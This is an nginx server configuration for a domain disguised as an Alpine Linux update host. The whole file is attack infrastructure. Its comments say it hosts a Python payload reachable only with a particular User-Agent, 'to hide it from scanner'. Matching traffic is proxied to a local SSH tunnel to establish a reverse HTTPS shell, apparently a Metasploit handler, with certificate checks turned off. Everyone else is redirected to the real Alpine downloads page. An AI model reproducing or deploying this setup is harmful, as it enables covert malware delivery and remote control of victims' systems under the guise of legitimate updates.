server {
    server_name ns-alpine-sys-update.duckdns.org;

    # 1. host the payload and hide it from scanner
    location = /update.py {
        
        if ($http_user_agent != "AlpineUpdaterInit/1.0") {
            return 404;
        }
        root /var/www/html;
    }

    
    # 2. estabilish reverse https shell and redirect scanner
    location / {
        
        if ($http_user_agent != "AlpineUpdater/1.3") {
            return 302 https://alpinelinux.org/downloads/;
        }

        # forward to the SSH Tunnel on Port 9000
        proxy_pass https://127.0.0.1:9000;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header User-Agent $http_user_agent;
        
        # accept metasploit self signed certificate
	proxy_ssl_verify off;
    }

    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/ns-alpine-sys-update.duckdns.org/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/ns-alpine-sys-update.duckdns.org/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
}

server {
    if ($host = ns-alpine-sys-update.duckdns.org) {
        return 301 https://$host$request_uri;
    } # managed by Certbot


    listen 80;
    server_name ns-alpine-sys-update.duckdns.org;
    return 404; # managed by Certbot


}
